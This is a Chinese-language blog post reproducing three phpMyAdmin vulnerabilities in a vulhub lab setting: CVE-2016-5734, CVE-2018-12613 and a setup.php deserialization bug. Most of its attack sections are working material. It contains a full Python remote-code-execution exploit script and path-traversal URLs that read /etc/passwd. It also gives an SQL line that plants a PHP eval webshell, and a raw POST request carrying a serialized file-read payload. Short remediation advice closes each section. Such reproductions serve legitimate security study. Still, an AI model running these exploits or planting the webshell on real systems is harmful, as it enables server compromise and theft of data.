---
title: phpMyAdmin系列漏洞
author: jh2ng
cover: 'https://image.jh2ing.com/Alt%20text.png'
tags:
  - vulhub
categories:
  - 漏洞复现
abbrlink: 38924
date: 2023-06-04 17:10:00
---

### phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）

#### 漏洞描述
phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进`preg_replace`函数第一个参数中。
在PHP5.4.7以前，`preg_replace`的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。

#### 影响版本
- `4.0.10.16`之前`4.0.x`版本
- `4.4.15.7`之前`4.4.x`版本
- `4.6.3`之前`4.6.x`版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）


#### 漏洞复现
编辑一个`grep_replace.php`文件，内容如下：
```php
```php
<?php
    highlight_file(__FILE__);
    $raw = $_GET['raw'];
    $replace = $_GET['replace'];
    $text = $_GET['text'];

    $text = preg_replace('/'.$raw.'/e', $replace, $text);
?>
```
将该文件放置在网站的根目录下，访问`http://your-ip//preg_replace.php??raw=a&replace=system("whoami")&text=aaa`，即可看到执行结果：
```
<?php
    highlight_file(__FILE__);
    $raw = $_GET['raw'];
    $replace = $_GET['replace'];
    $text = $_GET['text'];

    $text = preg_replace('/'.$raw.'/e', $replace, $text);
?> desktop-e5nsaug\test desktop-e5nsaug\test desktop-e5nsaug\test
```

 访问`http://your-ip:8080`，即可看到phpMyAdmin的登录页面。使用`root`:`root`登录。
用此[POC脚本]('https://www.exploit-db.com/exploits/40185/') 来复现漏洞。
```shell
./cve-2016-5734.py -c 'system(id);' -u root -p root -d test http://your-ip:8080/
```
-d是已经可以写的数据库，-c是待执行的PHP语句，如果没有指定表名，这个POC会创建一个名为`prgpwn`的表。
```python
#!/usr/bin/env python

"""cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit
Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.
CVE: CVE-2016-5734
Author: https://twitter.com/iamsecurity
run: ./cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');"
"""

import requests
import argparse
import sys

__author__ = "@iamsecurity"

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("url", type=str, help="URL with path to PMA")
    parser.add_argument("-c", "--cmd", type=str, help="PHP command(s) to eval()")
    parser.add_argument("-u", "--user", required=True, type=str, help="Valid PMA user")
    parser.add_argument("-p", "--pwd", required=True, type=str, help="Password for valid PMA user")
    parser.add_argument("-d", "--dbs", type=str, help="Existing database at a server")
    parser.add_argument("-T", "--table", type=str, help="Custom table name for exploit.")
    arguments = parser.parse_args()
    url_to_pma = arguments.url
    uname = arguments.user
    upass = arguments.pwd
    if arguments.dbs:
        db = arguments.dbs
    else:
        db = "test"
    token = False
    custom_table = False
    if arguments.table:
        custom_table = True
        table = arguments.table
    else:
        table = "prgpwn"
    if arguments.cmd:
        payload = arguments.cmd
    else:
        payload = "system('uname -a');"

    size = 32
    s = requests.Session()
    # you can manually add proxy support it's very simple ;)
    # s.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    s.verify = False
    sql = '''CREATE TABLE `{0}` (
      `first` varchar(10) CHARACTER SET utf8 NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
    INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));
    '''.format(table)

    # get_token
    resp = s.post(url_to_pma + "/?lang=en", dict(
        pma_username=uname,
        pma_password=upass
    ))
    if resp.status_code is 200:
        token_place = resp.text.find("token=") + 6
        token = resp.text[token_place:token_place + 32]
    if token is False:
        print("Cannot get valid authorization token.")
        sys.exit(1)

    if custom_table is False:
        data = {
            "is_js_confirmed": "0",
            "db": db,
            "token": token,
            "pos": "0",
            "sql_query": sql,
            "sql_delimiter": ";",
            "show_query": "0",
            "fk_checks": "0",
            "SQL": "Go",
            "ajax_request": "true",
            "ajax_page_request": "true",
        }
        resp = s.post(url_to_pma + "/import.php", data, cookies=requests.utils.dict_from_cookiejar(s.cookies))
        if resp.status_code == 200:
            if "success" in resp.json():
                if resp.json()["success"] is False:
                    first = resp.json()["error"][resp.json()["error"].find("<code>")+6:]
                    error = first[:first.find("</code>")]
                    if "already exists" in error:
                        print(error)
                    else:
                        print("ERROR: " + error)
                        sys.exit(1)
    # build exploit
    exploit = {
        "db": db,
        "table": table,
        "token": token,
        "goto": "sql.php",
        "find": "0/e\0",
        "replaceWith": payload,
        "columnIndex": "0",
        "useRegex": "on",
        "submit": "Go",
        "ajax_request": "true"
    }
    resp = s.post(
        url_to_pma + "/tbl_find_replace.php", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)
    )
    if resp.status_code == 200:
        result = resp.json()["message"][resp.json()["message"].find("</a>")+8:]
        if len(result):
            print("result: " + result)
            sys.exit(0)
        print(
            "Exploit failed!\n"
            "Try to manually set exploit parameters like --table, --database and --token.\n"
            "Remember that servers with PHP version greater than 5.4.6"
            " is not exploitable, because of warning about null byte in regexp"
        )
        sys.exit(1)
            
```

#### 修复建议

1. 升级phpMyAdmin
将受影响的phpMyAdmin版本升级到最新版本。最新版本可以从phpMyAdmin官方网站下载。

1. 限制访问权限
为了降低攻击风险，仅允许授权用户访问phpMyAdmin，并且不要将phpMyAdmin暴露在公共网络中。

1. 使用Web应用防火墙
可以使用Web应用防火墙（WAF）来阻止攻击者利用漏洞进行攻击。WAF可以检测并拦截来自攻击者的恶意请求。

### phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）

#### 漏洞描述
phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成 远程文件包含漏洞。

#### 影响版本
`phpMyAdmin 4.8.0`和`4.8.1`。

#### 漏洞复现
访问`http://your-ip:8080`，即可进入phpmyadmin。因配置的是`config`模式，所以无需输入密码，直接登录后台。

访问`http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd`，可见`/etc/passwd`被读取，说明文件包含漏洞存在。

**利用方式一：**
可以执行一下`SELECT '<?=phpinfo()?>';`，然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件。然后
访问`http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_XXXXXX`，即可看到phpinfo。
通过测试发现此方式无法包含一句话木马，可能因为对内容进行了一些过滤和处理。
**利用方式二：**
mysql5.0以上会创建日志文件，可以通过修改日志文件的路径，然后写入一句话木马，再包含日志文件，即可执行木马。
查看日志状态：`show variables like '%log%';`
开启日志：`set global general_log=on;`
设置日志路径：`set global general_log_file='/指定路径/1.php';`
此方法需要有SUPER权限权限，否则会报错。而在站库分离的情况下，数据库文件存储在数据库服务器上，而phpmyadmin在web服务器上，所以无法进行文件包含。
**利用方式三：**
将木马写入到数据库字段中，然后包含数据库文件，即可执行木马。
查看数据库文件路径：`show variables like '%datadir%';`
新建一个test表，然后将木马写入到字段中。
最后将数据库文件包含进来。
`http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/mysql/test/test.frm`
mysql后面跟/db_name/table_name.frm，即可包含数据库文件。
站库分离的情况下，数据库文件存储在数据库服务器上，而phpmyadmin在web服务器上，所以无法进行文件包含。

**利用方式四：**
利用`file_put_contents()`函数写入一句话木马，然后通过访问session文件包含木马，即可执行木马。
```sql
SELECT "<?=file_put_contents('1.php','<?php @eval($_POST[cmd]); ?>')?>";
```
访问`http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_XXXXXX`之后生成1.php，然后再访问`http://your-ip:8080/1.php`，即可发现写入成功，蚁剑连接即可。

#### 修复建议
1. 升级phpMyAdmin
2. 限制phpMyAdmin访问


### phpmyadmin scripts/setup.php 反序列化漏洞（WooYun-2016-199433）

#### 漏洞描述
phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。
#### 影响版本
phpMyAdmin 2.x版本
#### 漏洞复现
发送如下数据包，即可读取`/etc/passwd`：
```
POST /scripts/setup.php HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
```
[PhpMyAdmin某版本无需登录任意文件包含导致代码执行(可getshell)漏洞分析](https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.mottoin.com/4cb63e7c-9151-42da-a5bd-e6e29e7ff2f8/index.html)
#### 修复建议
- 尽快升级到最新版
- 将setup.php中28行中的”configuration”改为传入其他值
- 直接删除scripts目录，防止被恶意攻击。